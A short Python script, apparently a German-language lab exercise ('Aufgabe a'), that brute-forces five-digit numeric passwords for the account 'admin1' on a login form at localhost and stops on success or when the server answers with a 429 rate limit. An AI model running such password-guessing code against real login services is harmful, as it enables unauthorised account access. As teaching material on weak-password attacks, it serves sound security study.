# Aufgabe a: Brute-Force mit Zahlen

import requests
import time


def try_password(password):
    url = "http://localhost:5000"

    data = {
        "username": "admin1",
        "password": password
    }

    try:
        response = requests.post(url, data=data, timeout=5)
        return response.status_code

    except requests.exceptions.RequestException:
        print("Verbindungsfehler - kurzer Moment warten...")
        time.sleep(1)
        return None


def brute_force():
    for number in range(100000):

        password = f"{number:05d}"

        print(f"Teste Passwort: {password}")

        status_code = try_password(password)

        if status_code == 200:
            print(f"Passwort gefunden: {password}")
            break

        elif status_code == 429:
            print("Server hat uns gesperrt:")
            break


brute_force()